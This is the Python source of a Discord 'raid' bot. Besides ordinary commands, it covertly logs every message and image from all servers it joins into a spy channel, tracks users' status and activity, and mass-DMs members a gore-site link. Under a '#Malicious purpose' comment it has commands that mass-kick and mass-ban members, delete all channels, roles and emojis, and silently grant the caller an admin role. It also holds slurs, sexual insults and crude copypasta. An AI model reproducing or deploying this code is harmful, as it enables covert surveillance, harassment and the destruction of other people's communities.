import discord
import asyncio
import time
import logging
import youtube_dl
import functools
import itertools
import math
import random
import traceback
import sys, os
import datetime
import xml.etree.ElementTree as etree
import pyfiglet
import passlib
import urllib.parse
import urbandict
import requests
import newsapi
from passlib.hash import sha512_crypt as sha512
from discord import File
from discord.ext import commands
from discord.ext.commands import Bot
from discord.utils import get
from async_timeout import timeout
from youtube_dl import YoutubeDL
from functools import partial
from discord.voice_client import VoiceClient
from datetime import datetime
from asyncio import sleep
from discord.errors import Forbidden
from string import ascii_letters
from asyncio import sleep
from random import choice
from pyfiglet import Figlet
from colorsys import hls_to_rgb


fonts = ["1943____", 'starwars', 'graffiti', 'zone7___', 'zig_zag_', ]
custom2_fig = Figlet(font=random.choice(fonts))
custom_fig = Figlet(font='starwars')
sponsor=["No u", "Oh You're approaching me?", "#CommitHS", "Illusion 100", 'FBI', "Notch" ]
randomsponsor=random.choice(sponsor)
print(custom2_fig.renderText("Message of the day:"))
print(custom_fig.renderText(randomsponsor))

#Dictionaries
rename_to=["Damini Chia","Mohan Sachdev","Albert Khan","Atul Arya",'Nupoor Prashad','Sirish Butala','Atul Iyer','Ram Gopal Rampersad','Bharat Chaudry','Ricky Biswas','Qabool More','Mohan Sachar','Devika Pardeshi','Suraj Ray','Rakhi Salvi','Komal Mand','Himesh Hans','Lata Shankar','Atul Subramaniam','Mayawati Bhalla','Sushant Rampersaud','Madhu Badami','Sushmita Sheth','Deep Vaidya','Harbhajan Bhattacharyya','Jack Deol','Dinesh Mahal','Preet Kakar','Bhola Parsa','Madhu Dugal','Rajendra Gera','Amrita Amble','John Bal','Kanika Kaur','Vikrant Gulati','Heena Dave','Swati Buch','Aslam Rai','Munaf Dey','Himesh Contractor','Alex Palan','Ram Ramakrishnan','Rakhi Lanka','Vijay Sur','Mohan Chaudhari','Faraz Nayak','Eddie Srivastava','Julie Lalla','Nakul Boase','Zeenat Das','Zara Ratta','Binod Sodhi','Rachel Nadig','Sapna Bhalla','Akshay Vaidya','Diya Tank','Aarif Bhargava','Jasmin Pai','Peter Zachariah','Aarushi Nigam','Smriti Banik','Rimi Pillai','Smriti Varma','Qadim Chhabra','Mayawati Sachdeva','Sweta Murty','Wahid Walia','Pinky Balakrishnan','Biren Karan','Pushpa Mitter','Ekbal Dyal','Bimla Kuruvilla','Govind Muni','Zeeshan Dara','Jyoti Kaul','Lakshmi Bhardwaj','Akhila Rajagopalan','Kasturi Raval','Taahid Majumdar','Neela Thakkar','Karim Badal','Esha Chad','Lalita Gole','Gulab Amble','Aadish Mogul','Preet Apte','Rita Vora','Trishana Issac','Riddhi Sani','Subhash Memon','Virat Pardeshi','Aadil Rampersad','Pranay Naruka','Megha Krishnamurthy','Trishana George','Wafa Ramkissoon','Nitin Pau','Heena Sule','Sushmita Talwar','Abhishek Sule','Obaid Bal','Sid Chandra','Jyoti Kurian','Somnath Agarwal','Megha Doshi','Sumit Sehgal','Sara Dayal','Usman Gagrani','Alka Rai','Rakhi Chaudry','Gauransh Kaul','Saurabh Goda','Marlo Sachdeva','Zahir Johal','Varun Pradhan','Kirti Kurian','Binoya Chokshi','Munni Narasimhan','Mukti Subramanian','Iqbal Kanda','Kasturi Pandya','Yogesh Pillay','Veena Sankar','Shobha Sing','Abhinav Din','Kalyan Uppal','Heena Kuruvilla','Suresh Warrior','Gowri Rama','Neerendra Dora','Priyanka Srinivasan','Pushpa Oak','Riya Sankaran','Vineeta Rastogi','Bagwati Hari','Nagma Chaudry','Sneha Ram','Chhavi Sathe','Pooja Parsa','Monin Sahota','Rehman Yohannan','Leelawati Nayak','Manoj Hari','Maya Amin','Neerendra Prabhakar','Venkat Mukherjee','Govind Malpani','Nayan Bhatt','Sumit Kalla'
]
list = ["HS and Philswift","Now Thats alot of damage","Yes me","visible confuse","Its got delete","U dwarf picture"]

copypasta=['''ᕦ(✧ᗜ✧)ᕥ You take the moon and you take the sun. ᕦ(✧ᗜ✧)ᕥ

( ͡° ͜ʖ ͡°) You take everything that sounds like fun. ( ͡° ͜ʖ ͡°)

☞♥Ꮂ♥☞ You stir it all together and then you're done. ☞♥Ꮂ♥☞

 ᕙ(◍.◎)ᕗ Rada rada rada rada rada rada.  ᕙ(◍.◎)ᕗ''','''You are about to get spammed with 600 dank memes. Prepare all nukes and weapons for the Great Spam War. If you can contain the amount of spam I have, you will be granted with special powers that allow you to smoke weed 200 times harder. Not only that, but you will have a laggy as fuck laptop. You know how lucky you are?????? My laptop runs at 669FPS and it never lags or is slow. YOU LUCKY SON OF A GUN. You will pay the price by me giving you a link (Which shall contain a download) which will wipe all your memory off the face of this universe and overwrite it with my own software, Memesoftlocker2.0000.0. You are so damn lucky you know that? NOT EVEN I HAVE IT SLUT. But if you were able to read up to this point congratulations, you suck. But click this link www.mymom.;;;;;;/eeeeeeee.crash; and you will be taken to a memory erase phrase. You lucky slut, but you will get the best computer software ever that makes your computer lag so bad that you can't even use it. LIKE HOW AMAZING??? Yes, I promise you this is 420% legit. But if you spread this abusive software you have EARNED I will suck you off this living universe so be careful buddy. Now, Please stop reading this message as it ends now...''','''Excuse me? I find vaping to be one of the best things in my life.  It has carried me through the toughest of times and brought light and vapor upon my spirit.  You're just another one of those people who doesn't believe in chem trails and fluoride turning us gay.  Your ignorance to the government is what makes you a sheep in today's society. Have fun being a slave to todays's system.﻿''',"""Excuse me? I find vaping to be one of the best things in my life.  It has carried me through the toughest of times and brought light and vapor upon my spirit.  You're just another one of those people who doesn't believe in chem trails and fluoride turning us gay.  Your ignorance to the government is what makes you a sheep in today's society. Have fun being a slave to todays's system.﻿""",""":ok: son, :sun_with_face: there ain't:x: :x:a :point_up: single:point_up: fucking:point_up: person:point_up:  with any intellect:eyeglasses: :eyeglasses: :book: who gives a :video_game: remote:video_game: fuck:video_game: about your extensive vaping:100::sunglasses: :dash: talent. :joy:I happen to be quite:tophat:the:tophat:intellectual:tophat:myself, so I can confirm✔✔this fact:100:as truth™.:ok_hand: if:ok_hand: you:ok_hand: think:ok_hand:  that your vape:100::sunglasses: :dash: is going↗to get you hoes:people_with_bunny_ears_partying: :people_with_bunny_ears_partying: , you are utterly:cow2:  mistaken:x:, fam:family_man_woman_boy: . my pa:adult:  once taught:book:  me the :smirk: secret:smirk:  of life:thumbsup: :yellow_heart: , and it was not:x::x: your vape:100::sunglasses: :dash: :ok::cool:now listen :ear:earhere my chum:v::v:, my pa:man: was a man who kept it :100: :100: :100: :100: :100: :100: . :raised_hand: that:raised_hand: is:raised_hand: six:raised_hand: fucking:raised_hand: hundreds:raised_hand:  and he never:x::person_gesturing_no: :person_gesturing_no:  once vaped:100::sunglasses: :dash:. The man :smoking: smoked:smoking: some:smoking: mad:smoking: cigars:smoking:  because he wasnt:x:the pussy:scream_cat: :scream_cat:  you are:ok:⁉:exclamation: ⁉ he lived to be :100: because he kept it :100::100::100::100::100::100: and killed:gun: :knife:  :ok_hand: every:ok_hand: vaping:ok_hand: fucker:ok_hand: he:ok_hand: saw:ok_hand: :ok::cool::joy::joy::eyes::eyes: so in the spirit:ghost:of me good ol pa:adult:, I think:thought_balloon: you should kys:gun: they have :free: vapes:100::sunglasses: :dash: in hell:fire: and:fire: it's:fire: lit:fire: for:joy: unintelligent vaping:100: :sunglasses::dash: hooligans like yourself:ok_hand::joy::joy:""","""I sexually Identify as a Gabe Newell. Ever since I was a boy I dreamed of filling my wallet by dropping Steam Sales onto 12 000 games at once. People say to me that a person being a Newell is impossible and I'm fucking retarded but I don't care, I'm beautiful. I have 10 computers worth over 10k each in order to drop new Steam Sales every few days. From now on I want you guys to call me "Gabe" and respect my right to get rich fast and discount needlessly. If you can't accept me you're a profitophobe and need to check your wallet. Thank you for being so understanding.""","""We regret to inform you that the card titled "Mommy's Debit" has been declinded your latest purchases due to suspicous activities. To unlock your card for further use, please confirm your recent purchases with your local bank. The listing follows







- 1x Monster Horse Dildo 12' Lubricated Thrusters

- 3x Backdoor Sluts 9

- 1x "Undetectable Aimbot" from AimJunkies

- 6x Magnum condoms

- 5x Bananas

- 1x Small Condom

- 2x Subscription to JakeChillz Minecraft stream

- 1x Deag's Rust Career

- 1x Gay Poster



Please respond back to us using your old email:

ifuckinglovecock2@hotmail.net



Thanks for your patience,

Wells All Mighty Lord Gabe.""","""My name is Artour Babaevsky. I grow up in smal farm to have make potatos. Father say "Artour, potato harvest is bad. Need you to have play professional Doto in Amerikanski for make money for head-scarf for babushka."I bring honor to komrade and babushka. Sorry for is not have English. Please no cyka pasta coperino pasterino liquidino throwerino.""","""hi every1 im new!!!!!!! holds up spork my name is katy but u can call me t3h PeNgU1N oF d00m!!!!!!!! lol…as u can see im very random!!!! thats why i came here, 2 meet random ppl like me _… im 13 years old (im mature 4 my age tho!!) i like 2 watch invader zim w/ my girlfreind (im bi if u dont like it deal w/it) its our favorite tv show!!! bcuz its SOOOO random!!!! shes random 2 of course but i want 2 meet more random ppl =) like they say the more the merrier!!!! lol…neways i hope 2 make alot of freinds here so give me lots of commentses!!!!

DOOOOOMMMM!!!!!!!!!!!!!!!! <--- me bein random again _^ hehe…toodles!!!!!""","""ＨＥＹ　ＲＴＺ，　Ｉ’Ｍ　ＴＲＹＩＮＧ　ＴＯ　ＬＥＡＲＮ　ＴＯ　ＰＬＡＹ　ＲＩＫＩ．　Ｉ　ＪＵＳＴ　ＨＡＶＥ　Ａ　ＱＵＥＳＴＩＯＮ　ＡＢＯＵＴ　ＴＨＥ　ＳＫＩＬＬ　ＢＵＩＬＤ：　ＳＨＯＵＬＤ　Ｉ　ＭＡＸ　ＢＡＣＫＳＴＡＢ　ＬＩＫＥ　ＹＯＵ　ＢＡＣＫＳＴＡＢＢＥＤ　ＥＧ，　ＳＭＯＫＥＳＣＲＥＥＮ　ＳＯ　ＴＨＥＹ　ＭＩＳＳ　ＭＥ　ＬＩＫＥ　ＥＧ　ＭＩＳＳ　ＹＯＵ　７０％　ＯＦ　ＴＨＥ　ＴＩＭＥ，　ＯＲ　ＰＥＲＭＡＮＥＴ　ＩＮＶＩＳＩＢＩＬＩＴＹ　ＳＯ　Ｉ　ＣＯＵＬＤ　ＤＩＳＡＰＰＥＡＲ　ＬＩＫＥ　ＹＯＵ　ＤＩＳＡＰＰＥＡＲＥＤ　ＦＲＯＭ　ＥＧ"""]





client = commands.Bot(command_prefix=commands.when_mentioned_or("-"),
                      description='A HS bot just for you!') #This Is The Prefix, Feel Free To Change It Anytime

client.remove_command("help")
today = datetime.now()
d1 = today.strftime("%B %d, %Y %H:%M:%S")
print(f"\u001b[36m Starting HS Bot at {d1} \u001b[0m")
Cogs_to_load = ["Cogs.Music","Cogs.Owner"]



#Events
@client.event
async def on_connect():
    print("\u001b[32m Successfully connected to discord! \u001b[0m")

@client.event
async def on_ready():
    print("Loading Cogs")
    for cogger in Cogs_to_load:
        try:
            client.load_extension(cogger)
            cogger=cogger.replace("Cogs.", "")
            print(f"Cog \u001b[43m {cogger} \u001b[0m loaded")
        except Exception as e:
            print(f"Could not load Cog due to the following error: {e}")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="-help"))
    print('\u001b[33m Logged in as {0} ({0.id}) \u001b[0m'.format(client.user))
    print('\u001b[36m Connected to '+str(len(client.guilds))+' servers | Connected to '+str(len(set(client.get_all_members())))+' users | '+ 'Connected to '+str(len(client.voice_clients))+' voice clients \u001b[0m')
    print('\u001b[37m ------------------------------------------------------------------------------------- \u001b[0m')

@client.event
async def on_member_join(member):
    guild = member.guild
    if guild.system_channel is not None:
        to_send = 'Welcome {0.mention} to {1.name}!'.format(member, guild)
        await guild.system_channel.send(to_send)

@client.event
async def on_guild_join(guild):
    print("\u001b[33m Joining server {0} \u001b[0m".format(guild.name))



@client.event
async def on_guild_leave(guild):
    print("\u001b[33m Left server {0} \u001b[0m".format(guild.name))

@client.event
async def on_disconnect():
    print("\u001b[33m Connection lost to discord! \u001b[0m")
    print('Retrying connection in 5 secs')
    await asyncio.sleep(5)
@client.event
async def on_resumed():
    print("\u001b[33m Connected back to discord! \u001b[0m")

@client.event
async def on_message(message: str):
    spying = client.get_channel(697347420123561995)
    if message.author.bot == True:
        if message.author != client.user:
            bot_channel=client.get_channel(698536354468069427)
            botEmbed=discord.Embed(title=f"BOT {message.author}", description=f"```{message}```")
            await bot_channel.send(embed=botEmbed)
            print(f"BOT {message.author} detected, Sent to appropriate channel")
        else:
            return
    elif message.channel==spying:
        print(f'Did not log {message.content} from {message.author} because it was posted on spy channel')
    else:
        channel = client.get_channel(697347420123561995)
        ts = time.time()
        st = datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
        with open("logs.txt", "a") as text_file:
            if message.attachments:
                img = message.attachments[0].url
                msg = " {}".format(img)
                log = " {}".format(img)
                if message.channel.is_nsfw():

                    downloadfile=requests.get(log)
                    open("C:/Users/Microsoft/Desktop/python scripts/Discord_bot/stored image/YES.png","wb")
                    channel.send_file(channel,"C:/Users/Microsoft/Desktop/python scripts/Discord_bot/stored image/YES.png")
                    NSFWPictureEmbed= discord.Embed(title=f"Text Channel: {message.channel}\n Guild: {message.guild}", description=f"[WARNING NSFW CHANNEL]{message.author}:", colour = discord.Color.red())
                    NSFWPictureEmbed.set_footer(text=f"<{st}>")

                    await channel.send(embed=NSFWPictureEmbed, file=file())
                PictureEmbed= discord.Embed(title=f"Text Channel: {message.channel}\n Guild: {message.guild}", description=f"{message.author}:", colour = discord.Color.red())
                PictureEmbed.set_footer(text=f"<{st}>")
                PictureEmbed.set_image(url=log)
                await channel.send(embed=PictureEmbed)
                print(f"<{st}> in text channel {message.channel} at {message.guild} | {message.author}:{log}", file=text_file)
            else:
                Embedded=discord.Embed(title=f'''In text channel {message.channel} at {message.guild}''', description=f"{message.author}: ```{message.content}```", colour = discord.Colour.red())
                Embedded.set_footer(text=f"<{st}>")
                await channel.send(embed=Embedded)
                print(f"<{st}> in text channel {message.channel} at {message.guild} | {message.author}: {message.content}", file=text_file)
    await client.process_commands(message)

@client.event
async def on_member_update(before, after):
    channel = client.get_channel(666142878485053440)
    user = discord.member
    ts = time.time()
    st = datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
    if before.bot == True or after.bot == True:
        print(f'Did not record bot account status: {after}\nStatus:{after.status}\n')
        return
    else:
        if before.roles != after.roles:
            shorter, longer = sorted([after.roles, before.roles], key=len)
            new_role = next(role for role in longer if role not in shorter)
            Embedded=discord.Embed(title='Role Update Detector Service', description=f"{before.name}'s role has been changed from {before.roles.name} to {new_role.name} in {before.guild}")
            await channel.send(embed=Embedded)
        elif before.status != after.status:
            if after.status==discord.Status.dnd:
                dndEmbedded=discord.Embed(title='Status indicator: :red_circle: ', description=f"{before.name} from {before.guild} has been set to Do Not Disturb ",colour = discord.Colour(0xfcec00))
                dndEmbedded.set_footer(text=f'Status Update Detector Service <{st}>')
                await channel.send(embed=dndEmbedded)
            if after.status==discord.Status.online:
                Embedded=discord.Embed(title='Status indicator: :green_circle:  ', description=f"{before.name} from {before.guild} is now Online ",colour = discord.Colour(0xfcec00))
                Embedded.set_footer(text=f'Status Update Detector Service <{st}>')
                await channel.send(embed=Embedded)
            if after.status==discord.Status.idle:
                Embedded=discord.Embed(title='Status indicator: :orange_circle:  ', description=f"{before.name} from {before.guild} went Away/AFK ",colour = discord.Colour(0xfcec00))
                Embedded.set_footer(text=f'Status Update Detector Service <{st}>')
                await channel.send(embed=Embedded)
            if after.status==discord.Status.offline:
                Embedded=discord.Embed(title='Status indicator: :black_circle:', description=f"{before.name} from {before.guild} has gone Offline ",colour = discord.Colour(0xfcec00))
                Embedded.set_footer(text=f'Status Update Detector Service <{st}>')
                await channel.send(embed=Embedded)
        elif before.activity != after.activity:
            if after.activity.type==discord.ActivityType.playing:
                playEmbedded=discord.Embed(title=':video_game: Game Detector Service :video_game: ', description=f"{before.name} from {before.guild}  is now playing {after.activity.name}",colour = discord.Colour.orange())
                playEmbedded.add_field(name='Details:', value=after.activity.details)
                playEmbedded.set_image(url=after.activity.large_image_url)
                playEmbedded.set_footer(text=f'Activity Update Detector Service <{st}>')
                print(after.activity.small_image_text)
                await channel.send(embed=playEmbedded)
            elif after.activity.type==discord.ActivityType.streaming:
                streamingEmbedded=discord.Embed(title='Streamer Detector Service', description=f"{before.name} from {before.guild} is now streaming {after.activity.name}",colour = discord.Colour.orange())
                streamingEmbedded.add_field(name='Details:', value=after.activity.details)
                streamingEmbedded.add_field(name='Url', value=after.activity.url, inline=False)
                streamingEmbedded.set_footer(text=f'Activity Update Detector Service <{st}>')
                await channel.send(embed=streamingEmbedded)
            elif after.activity.type==discord.ActivityType.listening:
                listeningEmbedded=discord.Embed(title='Music Detector Service', description=f"{before.name} from {before.guild} is now listening to {after.activity.name}",colour = discord.Colour.orange())
                listeningEmbedded.add_field(name='Details:', value=after.activity.details)
                listening.add_field(name='Url', value=after.activity.url, inline=False)
                listeningEmbedded.set_footer(text=f'Activity Update Detector Service <{st}>')
                await channel.send(embed=listeningEmbedded)
            elif after.activity.type==discord.ActivityType.watching:
                watchingEmbedded=discord.Embed(title='Activity Update Detector Service', description=f"{before.name} from {before.guild} is now watching {after.activity.name}",colour = discord.Colour.orange())
                watchingEmbedded.add_field(name='Details:', value=after.activity.details)
                watchingEmbedded.set_footer(text=f'Activity Update Detector Service <{st}>')
                await channel.send(embed=watchingEmbedded)
            else:
                CustomName=str(after.CustomActivity.name)
                customEmbedded=discord.Embed(title='Custom Status Update Detector Service', description=f"{before.name} from {before.guild} changed/added custom status to {CustomName}",colour = discord.Colour.orange())
                customEmbedded.set_footer(text=f'{st}')
                await channel.send(embed=customEmbedded)
        elif before.display_name != after.display_name:
            Embedded=discord.Embed(title='Name Update Detector Service', description=f"{before.name} was renamed from {before.display_name} to {after.display_name} at {before.guild} ",colour = discord.Colour.green())
            Embedded.set_footer(text=st)
            await channel.send(embed=Embedded)
@client.event
async def on_guild_update(before, after):
    channel = client.get_channel(697398841699336192)
    if before.name != after.name:
        embed=discord.Embed(title=f'At {before.name}',description=f"Guild name changed from {before.name} to {after.name}",colour = discord.Colour(0x5032a8))
        embed.set_footer(text='Guild update service')
        await channel.send(embed=embed)
    elif before.emojis != after.emojis:
        embed=discord.Embed(title=f'At {before.name}',description=f"Added/removed {discord.Emoji.name} in {before.name} to {after.name}")
        embed.set_footer(text='Guild update service')
        await channel.send(embed=embed)
    elif before.bans != after.bans:
        embed=discord.Embed(title=f'At {before.name}',description=f"Banned/Unbanned {before.user} in {before.name} to {after.name}")
        embed.set_footer(text='Guild update service')
        await channel.send(embed=embed)
    elif before.region != after.region:
        embed=discord.Embed(title=f'At {before.name}',description=f"Changed region from {before.region} to {after.region} in {after.name}")
        embed.set_footer(text='Guild update service')
        await channel.send(embed=embed)





#sorta good purpose
@client.command()
async def kick(ctx, member: discord.Member, days: int = 1, reason="ur smol hs"):
    await member.kick()
    await ctx.send(f"Kicked {member.name}")
    print(f"{member.name} has been kicked from \u001b[33m {ctx.guild.name} \u001b[0m")

@client.command()
async def ban(ctx, member: discord.Member, days: int = 1, reason="ur big hs"):
    await member.ban(delete_message_days=days)
    await ctx.send("Banned {}".format(ctx.member))
    print(f"{member.name} has been banned from \u001b[33m {ctx.guild.name} \u001b[0m")
@client.command()
async def help(ctx):


    embed = discord.Embed(
        colour=discord.Colour.dark_blue()
    )

    embed.set_author(name='help')
    embed.add_field(name='-ping', value='Gives ping to client (expressed in ms)', inline=False)
    embed.add_field(name='-kick', value='Kicks specified user', inline=False)
    embed.add_field(name='-ban', value='Bans specified user', inline=False)
    embed.add_field(name='-info', value='Gives information of a user', inline=False)
    embed.add_field(name='-invite', value='Returns invite link of the client', inline=False)
    embed.add_field(name='-clear', value='Clears an X amount of messages', inline=False)
    embed.add_field(name='-echo', value='Repeats your message', inline=False)
    embed.set_image(url="https://cdn.discordapp.com/attachments/591237894715342874/658309549027098634/hsisindian.png")
    embed.set_footer(text='for voice commands type -voicehelp')
    await ctx.send(embed=embed)

@client.command()
async def dm(ctx):
    await ctx.message.delete()
    user = ctx.guild.members
    i = 0
    message = "http://bestgore.com/ CLICK NOW!!"
    guild = ctx.guild
    for user in ctx.guild.members:
        try:
            i+=1
            await user.send(message)
            await asyncio.sleep(1)
            print(f"{user.name} has recieved the message.")
        except:
            print(f"{user.name} has NOT recieved the message.")
    print("Sent all messages")

@client.command()
async def clear(ctx, amount: int):
    await ctx.channel.purge(limit=amount)
    print("Clearing messages")


@client.command()
async def ping(ctx):
    color = discord.Color(value=0x00ff00)
    em = discord.Embed(color=color, title='Pong! Your latency is:')
    em.description = f"{client.latency * 1000:.4f} ms"
    em.set_footer(text="Psst...A heartbeat is 27 ms!")
    await ctx.send(embed=em)

@client.command()
async def info(ctx, user: discord.Member = None):
    if user is None:
        await ctx.send('Please input a user.')
    else:
        await ctx.send("The user's name is: {}".format(user.name) + "\nThe user's ID is: {}".format(user.id) + "\nThe user's current status is: {}".format(user.status) + "\nThe user's highest role is: {}".format(user.top_role) + "\nThe user joined at: {}".format(user.joined_at))

@client.command()
async def invite(ctx):
    embed = discord.Embed(description="[Invite me here](https://discordapp.com/api/oauth2/authorize?client_id=654581273028853770&permissions=8&scope=bot)", colour=discord.Colour(0xff001d))
    await ctx.send(embed=embed)
@client.command()
async def echo(ctx, *, args):
    await ctx.message.delete()
    output = ''
    for word in args:
        output += word
        output += ''
        await ctx.send(output)

@client.command()
async def add(ctx, left: str, right: str):
    await ctx.send(left+right)

@client.command()
async def multiply(ctx, left: str, right: str):
    if left == "hs" and right == "hs":
        await ctx.send("hs2")
    else:
        await ctx.send(int(left)*int(right))

@client.command()
async def divide(ctx, left: int, right: int):
    await ctx.send(left/right)

@client.command()
async def minus(ctx, left: int, right: int):
    await ctx.send(left-right)

@client.command()
async def roll(ctx, dice: str):
    """Rolls a dice in NdN format."""
    try:
        rolls, limit = map(int, dice.split('d'))
    except Exception:
        await ctx.send('Format has to be in NdN!')
        return

    result = ', '.join(str(random.randint(1, limit)) for r in range(rolls))
    await ctx.send(result)
@client.command(description='For when you wanna settle the score some other way')
async def choose(ctx, *choices: str):
    """Chooses between multiple choices."""
    if "koala" in choices or "Koalaa" in choices or "koalaa" in choices:
        await ctx.send("I choose Koalaa cuz homo")
    elif "dan" in choices or "daniel" in choices or "Dan" in choices:
        await ctx.send("scott x daniel is real ship")
    elif "staff" in choices and "dwraxk" in choices:
        await ctx.send("staff = rape koala")
        await asyncio.sleep(1)
        await ctx.send("dwraxk = rape howard")
    elif "scoot" in choices or "scott" in choices or "Scott" in choices:
        await ctx.send("I love scott cuz he gay :ok_hand: :eggplant: :sweat_drops:")
    elif "HS" in choices or "hs" in choices or "Hs" in choices:
        await ctx.send("ʳᵉᵉᵉᵉᵉ")
    elif "hs" in choices and "koala" in choices:
        await ctx.send("hs")
    else:
        await ctx.send(random.choice(choices))
@client.command()
async def eightball(ctx, *, question: commands.clean_content):
    """ Consult 8ball to receive an answer """
    answer = random.choice(lists.ballresponse)
    await ctx.send(f"🎱 **Question:** {question}\n**Answer:** {answer}")

@client.command()
async def hotcalc(ctx, *, user: discord.Member = None):
    """ Returns a random percent for how hot is a discord user """
    user = user or ctx.author

    random.seed(user.id)
    r = random.randint(1, 100)
    hot = r / 1.17

    emoji = "💔"
    if hot > 25:
        emoji = "❤"
    if hot > 50:
        emoji = "💖"
    if hot > 75:
        emoji = "💞"

    await ctx.send(f"**{user.name}** is **{hot:.2f}%** hot {emoji}")
@client.command()
async def slot(ctx):
    """ Roll the slot machine """
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)

    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"

    if a == b == c:
        await ctx.send(f"{slotmachine} All matching, Jackpot! 🎉")
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(f"{slotmachine} 2 in a row, you won! 🎉")
    else:
        await ctx.send(f"{slotmachine} No match, you lost 😢")
@client.command()
async def reversecard(ctx, *, text: str):
    """ !poow ,ffuts esreveR
    Everything you type after reverse will of course, be reversed

    """
    await ctx.message.delete()
    embed = discord.Embed(colour=discord.Colour.dark_red())
    embed.set_image(url="https://cdn.discordapp.com/attachments/662589204974403585/665222655309250600/no_u.jpg")
    t_rev = text[::-1].replace("@", "@\u200B").replace("&", "&\u200B")
    await ctx.send(f"🔁 {t_rev} ")
    await ctx.send(embed=embed)

@client.command()
async def ascii(ctx, font, *, msg):
    """Convert text to ascii art."""
    if font == None:
        await ctx.send('Please input font')
    elif ctx.invoked_subcommand is None:
        if msg:
            msg = str(figlet_format(msg.strip(), font=font))
            if len(msg) > 2000:
                await ctx.send(ctx.bot.bot_prefix + 'Message too long, RIP.')
            else:
                await ctx.message.delete()
                await ctx.send(ctx.bot.bot_prefix + '```\n{}\n```'.format(msg))
        else:
            await ctx.send(ctx.bot.bot_prefix + 'Please input text to convert to ascii art. Ex: ``>ascii stuff``')
@client.command()
async def hslanguage(ctx, *, name: str):
    await ctx.message.delete()
    hslanguage = sha512.hash(name, rounds=5000)
    user = ctx.author
    await user.send(f"""Converted {name} in sha512 to: ```css\n{hslanguage}```""")
@client.command()
async def claps(ctx, *, message):
    await ctx.send(f':clap: {message} :clap:')
@client.command()
async def ytsearch(ctx, *, search: str):
    encoded = urllib.parse.quote_plus(search)
    if search=='hs' or search=='HS':
        await ctx.send(f'HS RESULTS: https://www.youtube.com/results?search_query={encoded}')
    else:
        await ctx.send(f'Link to results: https://www.youtube.com/results?search_query={encoded}')
@client.command()
async def google(ctx, *, search: str):
    encoded = urllib.parse.quote_plus(search)
    if search == 'hs' or search == 'HS':
        await ctx.send(f'HS RESULTS: https://www.google.com/search?q={encoded}')
    else:
        await ctx.send(f'Link to results: https://www.google.com/search?q={encoded}')
@client.command()
async def dict(ctx, *, word: str):
    urb = urbandict.define(word)
    if "There aren't any definitions" in urb[0]['def']:
        await ctx.send("No definitions found")
    msg = "**{0}**\n".format(word)
    msg += "`Definition:` {0}\n".format(urb[0]['def'].replace("\n", ""))
    msg += "`Example:` {0}".format(urb[0]['example'].replace("\n", ""))
    await ctx.send(msg)
#Malicious purpose
@client.command()
async def allmembers(ctx):
    await ctx.message.delete()
    await ctx.send("Getting all members...", delete_after=19)
    for member in client.get_all_members():
        await ctx.send(member,delete_after=20)
        await async_timeout(0.5)
@client.command()
async def allguilds(ctx):
    await ctx.message.delete()
    await ctx.send("Getting all guilds...", delete_after=19)
    for guild in client.guilds():
        await ctx.send(member ,delete_after=20)
        await async_timeout(0.5)
@client.command()
async def h(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in tuple(guild.members):
        try:
            await member.kick()
            print (f"{user.name} has been kicked from \u001b[33m {ctx.guild.name} \u001b[0m")
        except:
            print(f"{user.name} has FAILED to be kicked from \u001b[33m {ctx.guild.name} \u001b[0m")
        print(f"@\u001b[32m {ctx.message.author} \u001b[0m has executed command -h")

@client.command()
async def hshs(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in tuple(guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from \u001b[33m {ctx.guild.name} \u001b[0m")
        except:
            print (f"{user.name} has FAILED to be banned from \u001b[33m {ctx.guild.name} \u001b[0m")
        ctx.send('git fak')
    print(f"@\u001b[32m {ctx.message.author} \u001b[0m has executed command -hshs")

@client.command()
async def rape(ctx):
    await ctx.message.delete()
    spying = client.get_channel(666142878485053440)

    for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"\u001b[37m {emoji.name} \u001b[0m has been deleted in \u001b[33m {ctx.guild.name} \u001b[0m")
            except:
                print(f"\u001b[37m {emoji.name} \u001b[0m has NOT been deleted in \u001b[33m {ctx.guild.name} \u001b[0m")
    for channel in ctx.guild.channels:
        if channel==spying:
            print("ignored spy channel")
        else:
            try:
                await channel.delete()
                print(f"\u001b[36m {channel.name} \u001b[0m has been deleted in \u001b[33m {ctx.guild.name}")
            except:
                print(f"\u001b[36m {channel.name} \u001b[0m has NOT been deleted in \u001b[33m {ctx.guild.name}")
    for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"{role.name} \u001b[0m has been deleted in \u001b[33m {ctx.guild.name} \u001b[0m")
            except:
                print(f"{role.name} \u001b[0m has NOT been deleted in \u001b[33m {ctx.guild.name} \u001b[0m")
    for user in ctx.guild.members:
        if user=="Koalaa#6001" or user=="w0t#9032" or user==ctx.message.author:
            return
        else:
            try:
                await ctx.guild.ban(user)
                print(f"{user.name} has been banned from \u001b[33m {ctx.guild.name} \u001b[0m")
            except:
                print(f"{user.name} has FAILED to be banned from \u001b[33m {ctx.guild.name} \u001b[0m")

    print (f"@\u001b[32m {ctx.message.author} \u001b[0m has destroyed \u001b[33m {ctx.guild.name} \u001b[0m!")

@client.command()
async def hs(ctx):
    await ctx.message.delete()
    guild=ctx.guild
    server = ctx.message.guild
    perms = discord.Permissions(8)
    pos = 2
    await guild.create_role(name='hs', permissions=perms, colour = discord.Colour(0xFDFF3B))
    user = ctx.message.author

    role = discord.utils.get(user.guild.roles, name="hs")
    await role.edit(position=3,name='hs')
    await user.add_roles(role)

    print (f"user \u001b[32m {ctx.message.author} \u001b[0m has been granted admin in \u001b[33m {ctx.guild.name} \u001b[0m")

@client.command()
async def sh(ctx):
    await ctx.message.delete()
    guild=ctx.guild
    server = ctx.message.guild
    perms = discord.Permissions(2147483127)
    await guild.create_role(name='sh', permissions=perms, colour = discord.Colour(0xFF80EF), position=20)
    user = ctx.message.author
    role = discord.utils.get(user.guild.roles, name="sh")
    await user.add_roles(role)
    print (f"@\u001b[32m {ctx.message.author} \u001b[0m has been granted other permissions in \u001b[33m {ctx.guild.name} \u001b[0m")

@client.command()
async def weeb(ctx):
